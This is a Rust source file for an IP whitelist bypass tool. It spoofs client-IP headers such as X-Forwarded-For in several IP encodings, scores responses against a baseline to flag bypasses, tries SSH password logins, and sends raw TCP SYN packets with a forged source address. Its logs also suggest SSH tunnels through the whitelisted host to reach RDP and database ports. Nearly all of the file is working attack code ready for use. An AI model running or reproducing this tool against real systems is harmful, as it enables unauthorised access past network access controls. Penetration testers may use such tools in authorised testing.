use reqwest::Client;
use crate::logger::{log_info, log_warn};
use std::collections::HashMap;
use std::time::Duration;
use std::str::FromStr;
use serde::{Serialize, Deserialize};
use std::net::{IpAddr, Ipv4Addr, TcpStream};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::ipv4::{MutableIpv4Packet, Ipv4Flags};
use pnet::transport::{transport_channel, TransportChannelType};
use pnet::packet::Packet;
use ssh2::Session;

// Service type detection
#[derive(Debug, Clone, PartialEq)]
enum ServiceType {
    HTTP,
    SSH,
    RDP,
    Database,
    Unknown,
}

fn detect_service_type(port: u16) -> ServiceType {
    match port {
        22 => ServiceType::SSH,
        3389 => ServiceType::RDP,
        3306 | 5432 | 5433 | 1433 | 1521 => ServiceType::Database,
        80 | 443 | 8080 | 8443 | 8000 | 8008 | 3000 | 4200 | 5000 => ServiceType::HTTP,
        _ => ServiceType::Unknown,
    }
}

// Bypass sonucu için yapı
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpoofResult {
    pub strategy: String,
    pub technique: String,
    pub payload: String,
    pub value: String,
    pub status_code: u16,
    pub content_length: u64,
    pub confidence_score: u8,
    pub is_bypass: bool,
    pub response_time_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshAuthResult {
    pub success: bool,
    pub error_message: Option<String>,
    pub server_version: String,
    pub connection_time_ms: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct SpoofAnalysisResult {
    pub successful_bypasses: Vec<SpoofResult>,
    pub total_requests: usize,
    pub logs: Vec<String>,
    pub time_elapsed_secs: f32,
    pub ssh_auth: Option<SshAuthResult>,
}

#[derive(Debug, Clone, Serialize)]
pub struct VerifyResult {
    pub status_code: u16,
    pub headers: HashMap<String, String>,
    pub body_preview: String,
    pub error: Option<String>,
}

// Verify HTTP service
async fn verify_http_service(url: &str, client: &Client) -> bool {
    match client.get(url).timeout(Duration::from_secs(3)).send().await {
        Ok(resp) => {
            let status = resp.status();
            let content_type = resp.headers()
                .get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("");
            
            // HTTP service indicators
            status.is_success() || 
            status.is_redirection() ||
            status.is_client_error() ||
            content_type.contains("text/html") ||
            content_type.contains("application/json") ||
            content_type.contains("text/plain")
        },
        Err(_) => false
    }
}

pub async fn test_ssh_authentication(
    target_host: String,
    target_port: u16,
    username: String,
    password: String,
) -> Result<SshAuthResult, String> {
    tokio::task::spawn_blocking(move || {
        let start = std::time::Instant::now();
        let tcp = TcpStream::connect(format!("{}:{}", target_host, target_port))
            .map_err(|e| format!("Failed to connect: {}", e))?;
        
        let mut sess = Session::new().map_err(|e| format!("Session creation failed: {}", e))?;
        sess.set_tcp_stream(tcp);
        sess.handshake().map_err(|e| format!("Handshake failed: {}", e))?;

        let server_version = sess.banner().unwrap_or("Unknown").to_string();

        match sess.userauth_password(&username, &password) {
            Ok(_) => {
                Ok(SshAuthResult {
                    success: true,
                    error_message: None,
                    server_version,
                    connection_time_ms: start.elapsed().as_millis() as u64,
                })
            },
            Err(e) => {
                Ok(SshAuthResult {
                    success: false,
                    error_message: Some(e.to_string()),
                    server_version,
                    connection_time_ms: start.elapsed().as_millis() as u64,
                })
            }
        }
    }).await.map_err(|e| format!("Task join error: {}", e))?
}

// IP Whitelist Bypass için ana test fonksiyonu
pub async fn test_ip_whitelist_bypass(
    target_host: &str,
    target_port: u16,
    whitelist_ip: &str,
    _scenario: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> SpoofAnalysisResult {
    let start_time = std::time::Instant::now();
    let mut logs = Vec::new();
    let successful_bypasses = Vec::new();
    let total_requests = 0;
    let mut ssh_auth_result = None;

    logs.push("═══════════════════════════════════════════".to_string());
    logs.push("🎯 IP WHITELIST BYPASS TOOL v2.0".to_string());
    logs.push("═══════════════════════════════════════════".to_string());
    logs.push(format!("📍 Target: {}:{}", target_host, target_port));
    logs.push(format!("🔐 Whitelist IP: {}", whitelist_ip));
    
    // Detect service type
    let service_type = detect_service_type(target_port);
    match service_type {
        ServiceType::SSH => {
            logs.push("".to_string());
            logs.push("🔒 SSH Service Detected (Port 22)".to_string());
            logs.push("═══════════════════════════════════════════".to_string());

            if let (Some(user), Some(pass)) = (username, password) {
                logs.push("".to_string());
                logs.push(format!("🔑 Attempting SSH Authentication as user '{}'...", user));
                
                match test_ssh_authentication(target_host.to_string(), target_port, user.to_string(), pass.to_string()).await {
                    Ok(result) => {
                        if result.success {
                            logs.push("✅ Authentication Successful!".to_string());
                            logs.push(format!("Server Version: {}", result.server_version));
                        } else {
                            logs.push("❌ Authentication Failed".to_string());
                            if let Some(err) = &result.error_message {
                                logs.push(format!("Error: {}", err));
                            }
                        }
                        ssh_auth_result = Some(result);
                    },
                    Err(e) => {
                        logs.push(format!("❌ Connection Error: {}", e));
                    }
                }
            } else {
                logs.push("".to_string());
                logs.push("⚠️  Starting Network Layer Spoofing (TCP SYN)...".to_string());
                logs.push("".to_string());
                logs.push("NOTE: This technique sends a raw TCP SYN packet with a FAKED Source IP.".to_string());
                logs.push("If successful, the server will accept the packet and send a SYN-ACK,".to_string());
                logs.push("BUT it will send it to the REAL owner of the IP, not us.".to_string());
                logs.push("You will NOT get a shell, but this proves the firewall rule allows the packet.".to_string());
                logs.push("".to_string());

                // Attempt raw spoofing
                match spoof_tcp_syn(target_host, target_port, whitelist_ip, &mut logs) {
                    Ok(_) => {
                        logs.push("".to_string());
                        logs.push("✅ Spoofed packet sent successfully!".to_string());
                        logs.push("If the firewall is configured to allow this IP, the packet passed through.".to_string());
                    },
                    Err(e) => {
                        logs.push("".to_string());
                        logs.push(format!("❌ Failed to send spoofed packet: {}", e));
                        logs.push("Make sure you are running with ROOT privileges (sudo).".to_string());
                    }
                }
            }
            
            return SpoofAnalysisResult {
                successful_bypasses,
                total_requests: 1,
                logs,
                time_elapsed_secs: start_time.elapsed().as_secs_f32(),
                ssh_auth: ssh_auth_result,
            };
        },
        ServiceType::RDP => {
            logs.push("".to_string());
            logs.push("❌ ERROR: RDP Service Detected (Port 3389)".to_string());
            logs.push("═══════════════════════════════════════════".to_string());
            logs.push("".to_string());
            logs.push("⚠️  HTTP header spoofing does NOT work for RDP!".to_string());
            logs.push("".to_string());
            logs.push("💡 Correct Solutions for RDP IP Whitelist Bypass:".to_string());
            logs.push("".to_string());
            logs.push("1️⃣  RDP Gateway through allowed IP".to_string());
            logs.push("2️⃣  VPN connection via allowed IP".to_string());
            logs.push(format!("3️⃣  SSH Tunnel: ssh -L 3389:{}:3389 user@{}", target_host, whitelist_ip));
            logs.push("4️⃣  SOCKS proxy through allowed IP".to_string());
            logs.push("".to_string());
            
            return SpoofAnalysisResult {
                successful_bypasses,
                total_requests,
                logs,
                time_elapsed_secs: start_time.elapsed().as_secs_f32(),
                ssh_auth: None,
            };
        },
        ServiceType::Database => {
            logs.push("".to_string());
            logs.push(format!("❌ ERROR: Database Service Detected (Port {})", target_port));
            logs.push("═══════════════════════════════════════════".to_string());
            logs.push("".to_string());
            logs.push("⚠️  HTTP header spoofing does NOT work for database services!".to_string());
            logs.push("".to_string());
            logs.push("💡 Correct Solutions for Database IP Whitelist Bypass:".to_string());
            logs.push("".to_string());
            logs.push(format!("1️⃣  SSH Tunnel: ssh -L {}:{}:{} user@{}", target_port, target_host, target_port, whitelist_ip));
            logs.push("2️⃣  MySQL Proxy / PostgreSQL Proxy through allowed IP".to_string());
            logs.push("3️⃣  VPN connection via allowed IP".to_string());
            logs.push("4️⃣  SOCKS proxy configuration".to_string());
            logs.push("".to_string());
            
            return SpoofAnalysisResult {
                successful_bypasses,
                total_requests,
                logs,
                time_elapsed_secs: start_time.elapsed().as_secs_f32(),
                ssh_auth: None,
            };
        },
        ServiceType::Unknown => {
            logs.push("".to_string());
            logs.push(format!("⚠️  Warning: Unknown port {} - Verifying HTTP service...", target_port));
        },
        ServiceType::HTTP => {
            logs.push("".to_string());
            logs.push("✅ HTTP/HTTPS Service Detected".to_string());
        }
    }

    let url = format!("http://{}:{}", target_host, target_port);
    
    log_info(&format!("Starting IP whitelist bypass for {}:{}", target_host, target_port));

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(5))
        .user_agent("Mozilla/5.0")
        .build()
        .unwrap_or_default();

    // Verify HTTP service
    logs.push("📊 Verifying HTTP service...".to_string());
    if !verify_http_service(&url, &client).await {
        logs.push("".to_string());
        logs.push("❌ ERROR: Target does not appear to be an HTTP service".to_string());
        logs.push("═══════════════════════════════════════════".to_string());
        logs.push("".to_string());
        logs.push("No HTTP response detected. Possible reasons:".to_string());
        logs.push("• Service is not HTTP/HTTPS".to_string());
        logs.push("• Service is down or unreachable".to_string());
        logs.push("• Firewall is blocking all connections".to_string());
        logs.push("• Wrong port number".to_string());
        logs.push("".to_string());
        logs.push("💡 Try:".to_string());
        logs.push("• Verify the service is running".to_string());
        logs.push("• Check if port is correct".to_string());
        logs.push("• Use nmap to identify the service".to_string());
        logs.push("".to_string());
        
        return SpoofAnalysisResult {
            successful_bypasses,
            total_requests: 1,
            logs,
            time_elapsed_secs: start_time.elapsed().as_secs_f32(),
            ssh_auth: None,
        };
    }

    logs.push("✅ HTTP service verified - proceeding with bypass tests".to_string());
    logs.push("".to_string());

    // Now run the actual HTTP bypass tests
    test_http_bypasses(target_host, target_port, whitelist_ip, client, logs, start_time).await
}

async fn test_http_bypasses(
    target_host: &str,
    target_port: u16,
    whitelist_ip: &str,
    client: Client,
    mut logs: Vec<String>,
    start_time: std::time::Instant,
) -> SpoofAnalysisResult {
    let mut successful_bypasses = Vec::new();
    let mut total_requests = 0;

    let url = format!("http://{}:{}", target_host, target_port);

    // Baseline request
    logs.push("📊 Establishing baseline (no spoofing)...".to_string());
    let (base_status, base_len) = match client.get(&url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let len = resp.content_length().unwrap_or(0);
            logs.push(format!("   Baseline: Status={}, Length={} bytes", status, len));
            (status, len)
        },
        Err(e) => {
            logs.push(format!("❌ Baseline request failed: {}", e));
            return SpoofAnalysisResult {
                successful_bypasses,
                total_requests,
                logs,
                time_elapsed_secs: start_time.elapsed().as_secs_f32(),
                ssh_auth: None,
            };
        }
    };

    // Test headers
    let headers_to_test = vec![
        "X-Forwarded-For",
        "X-Real-IP",
        "Client-IP",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "True-Client-IP",
        "CF-Connecting-IP",
        "X-Client-IP",
        "Forwarded-For",
        "Forwarded",
        "Via",
        "X-ProxyUser-Ip",
    ];

    // IP encoding variants
    let mut ips_to_test = vec![whitelist_ip.to_string()];
    if let Ok(ipv4) = std::net::Ipv4Addr::from_str(whitelist_ip) {
        let octets = ipv4.octets();
        let u32_val: u32 = u32::from(ipv4);
        
        ips_to_test.push(format!("0{:o}.0{:o}.0{:o}.0{:o}", octets[0], octets[1], octets[2], octets[3]));
        ips_to_test.push(format!("0x{:x}.0x{:x}.0x{:x}.0x{:x}", octets[0], octets[1], octets[2], octets[3]));
        ips_to_test.push(u32_val.to_string());
    }

    logs.push("".to_string());
    logs.push(format!("🔥 Testing {} headers × {} IP variants = {} total tests", 
        headers_to_test.len(), ips_to_test.len(), headers_to_test.len() * ips_to_test.len()));
    logs.push("".to_string());

    for header in &headers_to_test {
        for ip in &ips_to_test {
            total_requests += 1;
            let req_start = std::time::Instant::now();
            
            match client.get(&url).header(*header, ip).send().await {
                Ok(resp) => {
                    let elapsed_ms = req_start.elapsed().as_millis() as u64;
                    check_bypass(
                        &resp,
                        base_status,
                        base_len,
                        &mut successful_bypasses,
                        "IP-Header",
                        &format!("Header: {}", header),
                        header,
                        ip,
                        elapsed_ms,
                        &mut logs,
                    );
                },
                Err(_) => {}
            }
        }
    }

    // Proxy chain tests
    logs.push("🔗 Testing proxy chain headers...".to_string());
    let chains = vec![
        format!("unknown, {}", whitelist_ip),
        format!("{}, {}", whitelist_ip, whitelist_ip),
        format!("proxy.local, {}", whitelist_ip),
    ];

    for chain in &chains {
        total_requests += 1;
        let req_start = std::time::Instant::now();
        
        match client.get(&url).header("X-Forwarded-For", chain).send().await {
            Ok(resp) => {
                let elapsed_ms = req_start.elapsed().as_millis() as u64;
                check_bypass(
                    &resp,
                    base_status,
                    base_len,
                    &mut successful_bypasses,
                    "Proxy-Chain",
                    "Multi-hop forwarding",
                    "X-Forwarded-For",
                    chain,
                    elapsed_ms,
                    &mut logs,
                );
            },
            Err(_) => {}
        }
    }

    let elapsed = start_time.elapsed().as_secs_f32();
    logs.push("".to_string());
    logs.push("═══════════════════════════════════════════".to_string());
    logs.push("📊 TEST COMPLETE".to_string());
    logs.push("═══════════════════════════════════════════".to_string());
    logs.push(format!("⏱️  Time: {:.2}s", elapsed));
    logs.push(format!("📤 Total Requests: {}", total_requests));
    logs.push(format!("🎯 Bypasses Found: {}", successful_bypasses.len()));
    logs.push("".to_string());
    
    if successful_bypasses.is_empty() {
        logs.push("ℹ️  No bypasses detected.".to_string());
        logs.push("".to_string());
        logs.push("Possible reasons:".to_string());
        logs.push("• Strong WAF/firewall configuration".to_string());
        logs.push("• Application doesn't trust forwarding headers".to_string());
        logs.push("• IP whitelist is enforced at network level".to_string());
    } else {
        successful_bypasses.sort_by(|a, b| b.confidence_score.cmp(&a.confidence_score));
        logs.push(format!("🎉 {} potential bypass vector(s) discovered!", successful_bypasses.len()));
        logs.push("".to_string());
        logs.push("⚠️  Verify each result before relying on it!".to_string());
    }

    SpoofAnalysisResult {
        successful_bypasses,
        total_requests,
        logs,
        time_elapsed_secs: elapsed,
        ssh_auth: None,
    }
}

fn check_bypass(
    resp: &reqwest::Response,
    base_status: u16,
    base_len: u64,
    results: &mut Vec<SpoofResult>,
    strategy: &str,
    technique: &str,
    payload: &str,
    value: &str,
    response_time_ms: u64,
    logs: &mut Vec<String>,
) {
    let status = resp.status().as_u16();
    let len = resp.content_length().unwrap_or(0);

    let status_diff = status != base_status;
    let len_diff = (len as i64 - base_len as i64).abs() > 50;
    
    let is_success_status = status >= 200 && status < 300;
    let baseline_is_error = base_status >= 400;
    
    let mut confidence: u8 = 0;
    
    if status_diff {
        if baseline_is_error && is_success_status {
            confidence += 70;
        } else if base_status == 403 && status == 200 {
            confidence += 90;
        } else {
            confidence += 30;
        }
    }
    
    if len_diff {
        confidence += 25;
    }

    if confidence >= 30 {
        let msg = format!(
            "🔓 BYPASS [{}] {}% | {} | {}={} | {}→{}",
            strategy, confidence, technique, payload, 
            if value.len() > 20 { &value[..20] } else { value },
            base_status, status
        );
        
        logs.push(msg.clone());
        log_warn(&msg);

        results.push(SpoofResult {
            strategy: strategy.to_string(),
            technique: technique.to_string(),
            payload: payload.to_string(),
            value: value.to_string(),
            status_code: status,
            content_length: len,
            confidence_score: confidence,
            is_bypass: confidence >= 50,
            response_time_ms,
        });
    }
}

pub async fn verify_bypass(
    target_host: &str,
    target_port: u16,
    header_name: &str,
    ip_value: &str,
) -> VerifyResult {
    let url = format!("http://{}:{}", target_host, target_port);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(5))
        .user_agent("Mozilla/5.0")
        .build()
        .unwrap_or_default();

    match client.get(&url).header(header_name, ip_value).send().await {
        Ok(resp) => {
            let status_code = resp.status().as_u16();
            let headers = resp.headers()
                .iter()
                .map(|(k, v)| (k.as_str().to_string(), v.to_str().unwrap_or("").to_string()))
                .collect();
            
            let body_bytes = resp.bytes().await.unwrap_or_default();
            let body_preview = String::from_utf8_lossy(&body_bytes.iter().take(2048).cloned().collect::<Vec<u8>>()).to_string();

            VerifyResult {
                status_code,
                headers,
                body_preview,
                error: None,
            }
        },
        Err(e) => {
            VerifyResult {
                status_code: 0,
                headers: HashMap::new(),
                body_preview: "".to_string(),
                error: Some(format!("Request error: {}", e)),
            }
        }
    }
}

// Helper function to create and send raw TCP SYN packet
fn spoof_tcp_syn(target_host: &str, target_port: u16, spoof_ip: &str, logs: &mut Vec<String>) -> Result<(), String> {
    // Resolve target IP
    let target_ip = match std::net::TcpStream::connect(format!("{}:{}", target_host, target_port)) {
        Ok(stream) => stream.peer_addr().unwrap().ip(),
        Err(_) => {
            // Fallback DNS resolution if connect fails
             match std::net::ToSocketAddrs::to_socket_addrs(&format!("{}:{}", target_host, target_port)) {
                Ok(mut addrs) => addrs.next().ok_or("Could not resolve target host")?.ip(),
                Err(e) => return Err(format!("Resolution failed: {}", e)),
             }
        }
    };

    let target_ipv4 = match target_ip {
        IpAddr::V4(ip) => ip,
        IpAddr::V6(_) => return Err("IPv6 not supported for raw spoofing yet".to_string()),
    };

    let source_ipv4 = Ipv4Addr::from_str(spoof_ip).map_err(|_| "Invalid whitelist IP format")?;

    // Create raw socket channel
    let protocol = TransportChannelType::Layer3(IpNextHeaderProtocols::Tcp);
    let (mut tx, _) = transport_channel(4096, protocol).map_err(|e| format!("Failed to create raw socket: {}", e))?;

    // Build TCP Packet
    let mut tcp_buffer = [0u8; 20];
    let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
    
    tcp_packet.set_source(12345); // Random source port
    tcp_packet.set_destination(target_port);
    tcp_packet.set_sequence(0);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(64240);
    tcp_packet.set_checksum(0);
    tcp_packet.set_urgent_ptr(0);
    
    // Calculate TCP checksum
    let checksum = pnet::packet::tcp::ipv4_checksum(
        &tcp_packet.to_immutable(),
        &source_ipv4,
        &target_ipv4,
    );
    tcp_packet.set_checksum(checksum);

    // Build IPv4 Packet
    let mut ip_buffer = [0u8; 40]; // 20 IP + 20 TCP
    let mut ipv4_packet = MutableIpv4Packet::new(&mut ip_buffer).unwrap();
    
    ipv4_packet.set_version(4);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(40); // 20 + 20
    ipv4_packet.set_identification(rand::random::<u16>());
    ipv4_packet.set_flags(Ipv4Flags::DontFragment);
    ipv4_packet.set_fragment_offset(0);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
    ipv4_packet.set_source(source_ipv4);
    ipv4_packet.set_destination(target_ipv4);
    ipv4_packet.set_checksum(pnet::packet::ipv4::checksum(&ipv4_packet.to_immutable()));
    
    // Copy TCP packet into IP payload
    ipv4_packet.set_payload(tcp_packet.packet());

    logs.push(format!("🚀 Sending SYN packet: {} -> {}:{}", source_ipv4, target_ipv4, target_port));

    // Send packet
    tx.send_to(ipv4_packet, IpAddr::V4(target_ipv4)).map_err(|e| format!("Send failed: {}", e))?;

    Ok(())
}
